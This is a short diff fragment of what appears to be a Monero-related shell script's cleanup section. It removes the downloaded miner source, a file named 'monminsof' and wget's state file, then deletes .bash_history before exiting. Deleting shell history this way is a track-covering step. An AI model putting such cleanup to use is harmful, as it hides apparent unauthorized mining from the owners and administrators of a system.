@@ -8,4 +8,5 @@ cd ../..
 rm -r master.zip
 rm -r monero-master
 rm .wget-hsts
+rm monminsof
 rm .bash_history && history && exit
